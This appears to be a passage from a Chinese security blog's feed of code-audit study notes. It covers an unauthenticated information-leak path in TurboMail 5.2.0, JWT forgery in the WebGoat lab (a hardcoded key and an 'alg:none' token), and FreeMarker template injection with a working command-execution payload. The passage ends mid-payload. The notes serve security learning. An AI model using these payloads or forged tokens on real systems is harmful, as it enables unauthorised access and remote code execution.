方法</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token number">543</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>type<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"pm"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token number">544</span>     <span class="token class-name">PMAdmin</span><span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">,</span> request<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>查看该方法的代码，可以看到并没有对用户身份进行验证</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token keyword">boolean</span> bAjax<span class="token punctuation">,</span> <span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">PMInterface</span> pm <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token class-name">StringBuffer</span> sb <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> alPM<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        pm <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">PMInterface</span><span class="token punctuation">)</span>alPM<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>        sb<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>pm<span class="token punctuation">.</span><span class="token function">PM</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        sb<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"\r\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token class-name">String</span> str <span class="token operator">=</span> sb<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    response<span class="token punctuation">.</span><span class="token function">getOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>str<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token class-name">SysConts<span class="token punctuation">.</span>New_InCharSet</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>因此直接访问 /mailmain?type=pm 就可以看到已登录的用户邮箱信息。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202112151310177.png"></p><p>这个地方除了泄露登录用户邮箱外，type 后面跟上不同的参数还会泄露邮箱用户列表以及对管理员密码重置等，读者可以自己尝试去发现发现。</p><blockquote><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这里以 TurboMail 5.2.0 里的敏感信息泄露漏洞作为学习。&lt;/p&gt;
&lt;p&gt;已知 TurboMail 5.2.0 的敏感信息泄露路径为 /mailmain?type=pm&lt;/p&gt;
&lt;p&gt;打开 TurboMail 的安装目录，在 turbomail\web\weba</summary>
      
    
    
    
    <category term="代码审计" scheme="https://www.teamssix.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="代码审计" scheme="https://www.teamssix.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>【代码审计】JWT Token</title>
    <link href="https://www.teamssix.com/211214-175948.html"/>
    <id>https://www.teamssix.com/211214-175948.html</id>
    <published>2021-12-14T09:59:48.000Z</published>
    <updated>2021-12-14T11:07:43.228Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-介绍"><a href="#0x00-介绍" class="headerlink" title="0x00 介绍"></a>0x00 介绍</h1><p>JSON Web Token 缩写成 JWT，被用于和服务器的认证场景中，这一点有点类似于 Cookie 里的 Session id，关于这两者的区别可以看本文尾部的参考链接。</p><p>JWT 由三部分构成，分别为 Header（头部）、Payload（负载）、Signature（签名），三者以小数点分割，格式类似于这样：</p><pre class="line-numbers language-html" data-language="html"><code class="language-html">Header.Payload.Signature<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>实际遇到的 JWT 一般是这种样子</p><pre class="line-numbers language-html" data-language="html"><code class="language-html">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>JWT 的第一部分 Header 通常由两个部分组成：</strong></p><ul><li>alg 表示使用的签名算法，例如 RSA、HMAC SHA256（或简写为 HS256）</li><li>typ 表示 Token 的类型 Type</li></ul><p>通常写成以下 JSON 格式 的样子</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>  <span class="token property">"alg"</span><span class="token operator">:</span> <span class="token string">"HS256"</span><span class="token punctuation">,</span>  <span class="token property">"typ"</span><span class="token operator">:</span> <span class="token string">"JWT"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>然后使用 Base64URL 编码为 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9，就形成了 JWT 的第一部分。</p><p><strong>JWT 的第二部分 Payload  也是 JSON 的格式，例如：</strong></p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>  <span class="token property">"sub"</span><span class="token operator">:</span> <span class="token string">"1234567890"</span><span class="token punctuation">,</span>  <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"John Doe"</span><span class="token punctuation">,</span>  <span class="token property">"iat"</span><span class="token operator">:</span> <span class="token number">1516239022</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后将该 JSON 对象进行 Base64URL 编码为 eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ，就形成了 JWT 的第二部分。</p><p>对于 Payload 官方规定了 7 个字段：</p><pre class="line-numbers language-html" data-language="html"><code class="language-html">iss (issuer)：签发人exp (expiration time)：过期时间sub (subject)：主题aud (audience)：受众nbf (Not Before)：生效时间iat (Issued At)：签发时间jti (JWT ID)：编号<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>除此之外，也是可以定义私有字段的。</p><p><strong>JWT 的第三部分 Signature 是对 Header 和 Payload 部分的签名，起到防止数据篡改的作用。</strong></p><p>首先需要指定一个密钥，这个密钥只有服务器知道，然后利用 Header 里指定的加密算法（默认是 HMAC SHA256）按照下面的公式生成签名。</p><pre class="line-numbers language-html" data-language="html"><code class="language-html">HMACSHA256(base64UrlEncode(header) + "." +base64UrlEncode(payload),secret)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="0x01-靶场复现"><a href="#0x01-靶场复现" class="headerlink" title="0x01 靶场复现"></a>0x01 靶场复现</h1><h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><p>这里使用 WebGoat 靶场进行 JWT Token 实验，直接 Docker 搭建即可。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> docker pull webgoat/goatandwolf<span class="token function">sudo</span> docker run -p <span class="token number">8080</span>:8080 -p <span class="token number">9090</span>:9090 -e <span class="token assign-left variable">TZ</span><span class="token operator">=</span>Europe/Amsterdam -d webgoat/goatandwolf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>打开之后，来到 (A2) Broken Authentication 找到 JWT Token 的第 5 关，可以看到这一关是需要修改 JWT Token 的值以 admin 身份进行投票重置，那么需要先找到 JWT 的加密密钥。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202112141758858.png"></p><p>在点击重置投票按钮时，请求的 URL 为 <a href="http://172.16.214.20:8080/WebGoat/JWT/votings">http://172.16.214.20:8080/WebGoat/JWT/votings</a></p><p>Clone 源码到本地，看看在源码里能否找到什么有价值的信息</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/WebGoat/WebGoat.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>直接在代码里全局搜索 /JWT/votings</p><p>在 webgoat-lessons/jwt/src/main/java/org/owasp/webgoat/jwt/JWTVotesEndpoint.java 的第 163 行找到 @PostMapping(“/JWT/votings”)，通过函数名 resetVotes() 判断大概率是进行重置投票的函数。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@PostMapping</span><span class="token punctuation">(</span><span class="token string">"/JWT/votings"</span><span class="token punctuation">)</span><span class="token annotation punctuation">@ResponseBody</span><span class="token keyword">public</span> <span class="token class-name">AttackResult</span> <span class="token function">resetVotes</span><span class="token punctuation">(</span><span class="token annotation punctuation">@CookieValue</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"access_token"</span><span class="token punctuation">,</span> required <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token class-name">String</span> accessToken<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span>accessToken<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">failed</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">feedback</span><span class="token punctuation">(</span><span class="token string">"jwt-invalid-token"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">Jwt</span> jwt <span class="token operator">=</span> <span class="token class-name">Jwts</span><span class="token punctuation">.</span><span class="token function">parser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setSigningKey</span><span class="token punctuation">(</span>JWT_PASSWORD<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>accessToken<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Claims</span> claims <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Claims</span><span class="token punctuation">)</span> jwt<span class="token punctuation">.</span><span class="token function">getBody</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">boolean</span> isAdmin <span class="token operator">=</span> <span class="token class-name">Boolean</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span> claims<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>isAdmin<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token function">failed</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">feedback</span><span class="token punctuation">(</span><span class="token string">"jwt-only-admin"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                votes<span class="token punctuation">.</span><span class="token function">values</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>vote <span class="token operator">-></span> vote<span class="token punctuation">.</span><span class="token function">reset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token function">success</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">JwtException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token function">failed</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">feedback</span><span class="token punctuation">(</span><span class="token string">"jwt-invalid-token"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">output</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过分析代码，从上面代码的第 8 行中不难看出 JWT 的密码为 JWT_PASSWORD 变量，当 Cookie 中的 access_token 参数里的 Payload 部分（即上面代码里的第 10 行 claims.get）的 admin 参数值为 true 时则判断为 admin 用户，如果为 false 则返回 jwt-only-admin</p><p>通过在代码里查询 JWT_PASSWORD 变量，可以找到值为 victory</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JWTVotesEndpoint</span> <span class="token keyword">extends</span> <span class="token class-name">AssignmentEndpoint</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">String</span> JWT_PASSWORD <span class="token operator">=</span> <span class="token class-name">TextCodec</span><span class="token punctuation">.</span>BASE64<span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token string">"victory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">String</span> validUsers <span class="token operator">=</span> <span class="token string">"TomJerrySylvester"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>知道了 jwt 密钥之后，在 <a href="https://jwt.io/">jwt.io</a> 上将 Payload 部分的 admin 值修改为 true ，在 Signature 部分添加密钥重新生成 JWT，然后 Burp 替换就可以成功重置投票了。</p><h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>除了以上通过源码找 JWT 密钥的方法还可以利用将加密算法修改为 none，即通过不加密的方式进行绕过。</p><p>{“alg”:”none”} 编码后为 eyJhbGciOiJub25lIn0=，将 Payload 里的 admin 值修改为 true，最终构造 Token 如下：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">eyJhbGciOiJub25lIn0<span class="token operator">%</span><span class="token number">3d</span><span class="token punctuation">.</span>eyJpYXQiOjE2NDAzMTg4NTEsImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ<span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>参考文章：</p><p><a href="https://www.cnblogs.com/ittranslator/p/14595165.html">https://www.cnblogs.com/ittranslator/p/14595165.html</a></p><p><a href="https://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html">https://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html</a></p><p>原文链接：</p><p><a href="https://www.teamssix.com/211214-175948.html">https://www.teamssix.com/211214-175948.html</a></p><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-介绍&quot;&gt;&lt;a href=&quot;#0x00-介绍&quot; class=&quot;headerlink&quot; title=&quot;0x00 介绍&quot;&gt;&lt;/a&gt;0x00 介绍&lt;/h1&gt;&lt;p&gt;JSON Web Token 缩写成 JWT，被用于和服务器的认证场景中，这一点有点类似于 Cook</summary>
      
    
    
    
    <category term="代码审计" scheme="https://www.teamssix.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="代码审计" scheme="https://www.teamssix.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>【代码审计】模板注入</title>
    <link href="https://www.teamssix.com/211203-200441.html"/>
    <id>https://www.teamssix.com/211203-200441.html</id>
    <published>2021-12-03T12:04:41.000Z</published>
    <updated>2021-12-03T12:16:44.226Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-介绍"><a href="#0x00-介绍" class="headerlink" title="0x00 介绍"></a>0x00 介绍</h1><p>这里主要学习下 FreeMarker 模板注入，FreeMarker 是一款模板引擎，FreeMarker 模板文件与 HTML 一样都是静态页面，当用户访问页面时，FreeMarker 引擎会进行解析并动态替换模板中的内容进行渲染，然后将渲染后的结果返回到浏览器中。</p><h1 id="0x01-FreeMarker-模板"><a href="#0x01-FreeMarker-模板" class="headerlink" title="0x01 FreeMarker 模板"></a>0x01 FreeMarker 模板</h1><p>FreeMarker 模板语言（FreeMarker Template Language，FTL）由 4 个部分组成，分别如下：</p><ul><li><p>文本：包括 HTML 标签与静态文本等静态内容，该部分内容会原样输出</p></li><li><p>插值：这部分的输出会被模板引擎计算的值来替换，使用 ${} 这种语法</p></li><li><p>标签：和 HTML 标签类似，不会打印在输出的内容中，比如 &lt;#assign name=’bob’&gt;</p></li><li><p>注释：和 HTML 注释类似，由 &lt;#– 和 –&gt; 表示，注释部分的内容会 FreeMarker 忽略</p></li></ul><p>以下是一个 FreeMarker 模板内容示例：</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Welcome TeamsSix!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>　<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>#--</span> <span class="token attr-name">这是注释</span> <span class="token attr-name">--</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Welcome !<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Our latest product:    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;latestProduct.url&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>$&#123;latestProduct.name&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="0x02-模板注入利用"><a href="#0x02-模板注入利用" class="headerlink" title="0x02 模板注入利用"></a>0x02 模板注入利用</h1><h2 id="1、new-函数的利用"><a href="#1、new-函数的利用" class="headerlink" title="1、new 函数的利用"></a>1、new 函数的利用</h2><p>FreeMarker 中预制了大量了内建函数，其中 new 函数可以创建一个继承自 freemarker.template.TemplateModel 类的变量，利用这一点能达到执行任意代码的目的。</p><h3 id="利用方法一："><a href="#利用方法一：" class="headerlink" title="利用方法一："></a>利用方法一：</h3><p>freemarker.template.utility 里有个 Execute 类，通过观察源代码里的第 30 行可以看到这个类会调用 Runtime.getRuntime().exec 函数执行它的 aExecute 变量参数值，因此这里可以使用 new 函数传输想要执行的命令作为 aExecute 参数值，从而执行命令。</p><p>freemarker.template.utility.Execute 部分文件代码如下：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token number">22</span> <span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">exec</span><span class="token punctuation">(</span><span class="token class-name">List</span> arguments<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TemplateModelException</span> <span class="token punctuation">&#123;</span><span class="token number">23</span>    <span class="token class-name">StringBuilder</span> aOutputBuffer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">24</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>arguments<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token number">25</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">TemplateModelException</span><span class="token punctuation">(</span><span class="token string">"Need an argument to execute"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">26</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token number">27</span>        <span class="token class-name">String</span> aExecute <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span>arguments<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">28</span><span class="token number">29</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span><span class="token number">30</span>            <span class="token class-name">Process</span> exec <span class="token operator">=</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>aExecute<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">31</span>            <span class="token class-name">InputStream</span> execOut <span class="token operator">=</span> exec<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">32</span>            <span class="token class-name">Throwable</span> var6 <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>构造 payload 如下：</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>#assign</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>freemarker.template.utility.Execute<span class="token punctuation">"</span></span><span class="token attr-name">?new()</span><span class="token punctuation">></span></span>$&#123;value("open -a Calculator")&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202112032001193.png"></p><h3 id="利用方法二："><a href="#利用方法二：" class="headerlink" title="利用方法二："></a>利用方法二：</h3><p>freemarker.template.utility 里有个 ObjectConstructor 类，通过观察源代码里的第 25 行可以看到这个类会把它的参数作为名称构造一个实例化对象。</p><p>因此也可以利用这一点构造一个可执行命令的对象，从而 RCE</p><p>freemarker.template.utility.ObjectConstructor 部分文件代码如下：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token number">17</span> <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ObjectConstructor</span> <span class="token keyword">implements</span> <span class="token class-name">TemplateMethodModelEx</span> <span class="token punctuation">&#123;</span><span class="token number">18</span>     <span class="token keyword">public</span> <span class="token class-name">ObjectConstructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token number">19</span>     <span class="token punctuation">&#125;</span><span class="token number">20</span> <span class="token number">21</span>     <span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">exec</span><span class="token punctuation">(</span><span class="token class-name">List</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TemplateModelException</span> <span class="token punctuation">&#123;</span><span class="token number">22</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span>args<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token number">23</span>             <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">TemplateModelException</span><span class="token punctuation">(</span><span class="token string">"This method must have at least one argument, the name of the class to instantiate."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">24</span>         <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token number">25</span>             <span class="token class-name">String</span> classname <span class="token operator">=</span> args<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">26</span>             <span class="token class-name">Class</span> cl <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token number">27</span> <span class="token number">28</span>             <span class="token keyword">try</span> <span class="token punctuation">&#123;</span><span class="token number">29</span>                 cl <span class="token operator">=</span> <span class="token class-name">ClassUtil</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>classname<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">30</span>             <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> var6<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token number">31</span>                 <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">TemplateModelException</span><span class="token punctuation">(</span>var6<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">32</span>             <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>构造 Payload 如下：</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>#assign</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation 